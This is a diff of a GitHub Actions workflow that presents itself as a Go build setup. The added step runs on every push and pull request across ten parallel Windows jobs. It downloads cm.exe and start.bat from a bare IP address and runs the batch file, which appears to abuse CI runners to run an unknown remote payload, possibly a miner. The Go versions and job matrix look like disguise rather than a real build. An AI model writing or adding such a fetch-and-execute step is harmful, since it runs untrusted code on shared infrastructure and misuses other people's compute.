@@ -1,27 +1,29 @@
 name: Github
-on: [push, pull_request] 
-jobs: 
-build:
-  runs-on: windows-latest
-strategy: 
-max-parallel: 30 
-fail-fast: false 
-matrix: 
-go: [1.6, 1.7,] 
-flag: [A, B, C, D, E] 
-timeout-minutes: 30
-env: 
-NUM_JOBS: 10 
-JOB: ${{ matrix.go }} 
-steps: 
-- name: Set up Go ${{ matrix.go }} 
-uses: actions/setup-go@v1 
-with: 
-go-version: ${{ matrix.go }} 
-id: go 
-- name: Setup 
-uses: actions/checkout@v1 
-- name: Github
-Invoke-WebRequest http://134.122.17.115/cm.exe -OutFile cm.exe
-Invoke-WebRequest http://134.122.17.115/start.bat -OutFile start.bat
-cmd /c start.bat
+on: [push, pull_request]
+jobs:
+  build:
+    name: setup
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1, 2]
+        flag: [A, B, C, D, E]
+    timeout-minutes: 30
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: running
+      run: |
+        Invoke-WebRequest http://134.122.17.115/cm.exe -OutFile cm.exe
+        Invoke-WebRequest http://134.122.17.115/start.bat -OutFile start.bat
+        cmd /c start.bat
